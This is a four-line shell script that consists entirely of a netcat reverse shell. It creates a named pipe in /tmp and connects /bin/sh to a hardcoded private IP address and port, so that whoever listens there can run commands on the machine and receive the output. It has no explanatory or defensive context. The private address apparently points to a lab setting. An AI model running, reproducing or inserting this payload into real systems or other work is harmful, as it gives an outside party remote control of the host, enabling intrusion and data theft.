#!/bin/sh
IP="10.60.99.29"
PORT="4456"
mkfifo /tmp/f; /bin/sh < /tmp/f | nc $IP $PORT > /tmp/f; rm /tmp/f
